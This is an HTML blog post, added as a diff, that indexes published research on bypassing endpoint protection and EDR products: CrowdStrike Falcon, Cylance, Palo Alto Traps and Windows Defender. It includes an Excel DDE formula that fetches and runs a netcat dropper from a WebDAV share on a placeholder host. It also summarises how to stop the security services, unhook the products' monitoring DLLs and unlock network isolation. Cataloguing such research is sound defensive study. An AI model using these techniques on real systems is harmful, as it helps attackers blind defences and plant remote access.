@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Endpoint Protection, Detection and Response Bypass Techniques Index ::
+        Pandora&#39;s Box
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="I&amp;rsquo;ve recently seen a bunch of articles and researches on endpoint protection and endpoint detection and response bypass techniques, so I decided to spend my research time to do document about these techniques and how was it done in summary. There is no category on these techniques as far as I know so I will simply categorize techniques by products.
+Before we begin, I would like to point out to another great research from @Hexacorn on a review of current EDR solutions on the market."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://pandora.sh/posts/epp-and-edr-bypass-techniques/" />
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+
+
+<link rel="stylesheet" href="https://pandora.sh/assets/style.css" />
+
+<link rel="stylesheet" href="https://pandora.sh/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="https://pandora.sh/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="https://pandora.sh/img/favicon.png" />
+
+
+<link href="https://pandora.sh/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://pandora.sh/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Endpoint Protection, Detection and Response Bypass Techniques Index"/>
+<meta name="twitter:description" content="I&#39;ve recently seen a bunch of articles and researches on endpoint protection and endpoint detection and response bypass techniques, so I decided to spend my research time to do document about these techniques and how was it done in summary. There is no category on these techniques as far as I know so I will simply categorize techniques by products."/>
+
+
+
+<meta property="og:title" content="Endpoint Protection, Detection and Response Bypass Techniques Index" />
+<meta property="og:description" content="I&#39;ve recently seen a bunch of articles and researches on endpoint protection and endpoint detection and response bypass techniques, so I decided to spend my research time to do document about these techniques and how was it done in summary. There is no category on these techniques as far as I know so I will simply categorize techniques by products." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://pandora.sh/posts/epp-and-edr-bypass-techniques/" />
+<meta property="article:published_time" content="2019-01-15T17:50:00+07:00" />
+<meta property="article:modified_time" content="2019-01-15T17:50:00+07:00" /><meta property="og:site_name" content="Pandora&#39;s Box" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Pandora&#39;s Box</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Endpoint Protection, Detection and Response Bypass Techniques Index</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2019-01-15
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— Written by P. Boonyakarn</span
+        >
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>I&rsquo;ve recently seen a bunch of articles and researches on endpoint protection and endpoint detection and response bypass techniques, so I decided to spend my research time to do document about these techniques and how was it done in summary. There is no category on these techniques as far as I know so I will simply categorize techniques by products.</p>
+<p>Before we begin, I would like to point out to another <a href="http://www.hexacorn.com/blog/2018/02/25/endpoint-detection-and-response-edr-solutions-sheet-update-2/">great</a> <a href="http://www.hexacorn.com/blog/2016/08/07/edr-sheet-explained/">research</a> from @Hexacorn on a review of current EDR solutions on the market. This spreadsheet presents EDRs features and capabilities in summary which is useful to utilize as targets to evade and bypass.</p>
+<h2 id="crowdstrike-falcon">CrowdStrike Falcon</h2>
+<p>tr4cefl0w posted on <a href="https://0x00sec.org/t/bypassing-crowdstrike-falcon-detection-from-phishing-email-to-reverse-shell/10802/1">0x00sec forum</a> on a technique to completely bypass Falcon detection capability. The technique is including the following steps:</p>
+<ul>
+<li>He achieved code execution via Dynamic Data Exchange (DDE) in Excel because Microsoft has already patched and disabled the feature in December 2017. The formula used to leverage this attack is simple <code>=cmd|'/c notepad.exe'!_xlbgnm.A1</code></li>
+<li>He utilized WebDAV server to drop a dropper, which is <code>nc.exe</code>. Apache2 with <code>mod_webdave</code> module enabled is used in this step. The embedded formula must be changed to something like <code>=cmd|'/c cmd.exe /c &quot;copy \\x.x.x.x\webdav\run.txt c:\users\public\run.exe&quot; &amp;&amp; cmd.exe /c &quot;c:\users\public\run.exe&quot;'!_xlbgnm.A1</code></li>
+<li>Unbelievably, it just works when he tried to simulate victim by open the attachment from email and allow embedded to execute</li>
+</ul>
+<p>Komodo Research <a href="https://www.komodosec.com/post/bypassing-crowdstrike">describes</a> three ways to bypass CrowdStrike falcon:</p>
+<ul>
+<li>With LOCAL SYSTEM, they can just disable user-mode service <code>CSFalconService</code> with net command which will prevent remote remediation from the console.</li>
+<li>They have a theory on not to leave things CrowdStrike will detect. To practice this theory, they create a reverse dynamic port forwarding tunnel on internal compromised machine. Thus, they can use the compromised machine to access the internal network without alerting from CrowdStrike Falcon.</li>
+<li>They just installed Qemu on the internal compromised machine for internal discovery and lateral movement.</li>
+</ul>
+<h2 id="cylance">Cylance</h2>
+<p>MDSec <a href="https://www.mdsec.co.uk/2019/03/silencing-cylance-a-case-study-in-modern-edrs/">covers</a> many interesting points for Cylance:</p>
+<ul>
+<li>The main feature focuses on blocking malicious script such as Windows Scripting, Powers and Office macros <a href="https://vimeo.com/322902013">doesn&rsquo;t cover</a> Excel 4.0 macros which is not much well known feature compared to VBA macros. More on <a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">weaponizing Excel 4.0 macros</a>.</li>
+<li>For Windows Scripting such as VBScript and JavaScript, it turns out that Cylance will only enforce their Scripting Control feature only an execution originally from <code>wscript.exe</code>. MDSec used this flaw by <a href="https://vimeo.com/322903302">executing malicious JavaScript with <code>mshta.exe</code></a>.</li>
+<li>For Memory Protections feature, Cylance injects <code>CyMemdef.dll</code> and <code>CyMemDef64.dll</code>to a process. When a malicious process is executing, hooks placed by these DLLs will use to detect execution of a suspicious function. From this fact, MDSec created a function to unhook Cylance&rsquo;s DLL from DLL export.</li>
+<li>Cylance also offers Application Control feature to prevent risky applications execution such as PowerShell. Cylance still uses the same technique as described on Memory Protections to enforce policies. MDSec found that inside <code>CyMemdef.dll</code> and <code>CyMemDef64.dll</code>, there is a function which compares the executable&rsquo;s name with something like <code>PowerShell.exe</code>. These DLLs also check for existence of reference to <code>powershell.pdb</code> in PE debug directory. If these two conditions are true, <code>CyMemDefPS64.dll</code> will be loaded to send a warning message. Thus, MDSec spawned PowerShell process with <code>CREATE_SUSPEND</code> flag and modify the reference to PDB before resuming an execution, resulting as bypassing Application Control feature.</li>
+<li>MDSec also found a way to bypass VBA execution protection. By analyzing Cylance, MDSec discovered that Cylance adds hooks to VBA runtime, for example, <code>VBE7.dll</code> which contains functions such as Shell and CreateObject. By the way, Cylance did nothing with the exposed COM object. So, MDSec just directly enabled Windows Script Host Object Model on VBA project to use <code>WshShell</code> object to bypass hooked <code>CreateObject</code>.</li>
+<li>Isolation feature on Cylance OPTICS stores an unlock key on <code>HKEY_LOCAL_MACHINE\SOFTWARE\Cylance\Optics\PdbP</code> which can be simply decrypted using DPAPI master key available on Cylance OPTIOCS assemblies. The Isolation feature can also be bypassed by executing <code>CyOptics.exe</code> control <code>unlock-net</code> without providing key from LOCAL SYSTEM.</li>
+</ul>
+<p>Hoang Bui <a href="https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6">pointed out</a> about hooking and bypassing techniques on <code>CyMemDef64.dll</code></p>
+<h2 id="palo-alto-traps">Palo Alto Traps</h2>
+<p><a href="https://www.c0d3xpl0it.com/2019/01/bypassing-paloalto-traps-edr-solution.html">@c0d3xpl0it</a> at Bits of Security wrote a blog to present an idea to bypass Traps. The technique utilized built-in tool <code>FLTMC.exe</code> which can be used to manage filter driver to unload Traps&rsquo; file monitoring filter driver. The technique required administrator privilege to issue the commands.</p>
+<h2 id="windows-defender">Windows Defender</h2>
+<p>Mantvydas Baranauskas at <a href="https://ired.team/offensive-security/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change">Red Teaming Experiments</a> presented an idea to modify shellcode in purpose of evading detection, which I personally think that it is similar but not the same to Ghost Writing technique I learnt on SEC504. This technique can be accomplished by changing parts of shellcode to avoid some kind of pattern detection, and flip it back before deploying to the allocated memory.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://pandora.sh/posts/deploy-misp-with-https/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Deploy Your Own Local MISP with HTTPS Supported by mkcert</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://pandora.sh/posts/settingscontent-ms-as-a-inital-access-vector/">
+                  <span class="button__text">Understandings on .SettingContent-ms as aื Initial Access Vector</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Pandora&#39;s Box</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+          <span>
+              <a href="https://webring.wonderful.software#pandora.sh" title="วงแหวนเว็บ" target="_blank" rel="noopener">
+                <img src="/img/webring.svg" width="20px" height="20px" alt="วงแหวนเว็บ" />
+              </a>
+          </span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://pandora.sh/assets/main.js"></script>
+<script src="https://pandora.sh/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
